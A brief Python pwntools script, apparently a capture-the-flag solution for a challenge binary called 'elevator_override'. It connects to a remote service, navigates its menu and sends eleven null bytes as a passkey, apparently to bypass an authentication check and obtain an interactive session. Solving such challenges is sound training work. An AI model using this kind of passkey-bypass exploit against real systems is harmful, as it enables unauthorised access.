from pwn import *

context.binary = elf = ELF('./elevator_override')
pr = process()
pr = remote(b'94.237.50.202',38325)
# gdb.attach(pr)

pr.recvuntil(b'> ')
pr.sendline(b'CF')
pr.sendline(b'7')

pr.recvuntil(b'>')
pr.sendline(b'OD')
pr.recvuntil(b'passkey: ')

pr.send(b'\x00'*11)
pr.interactive()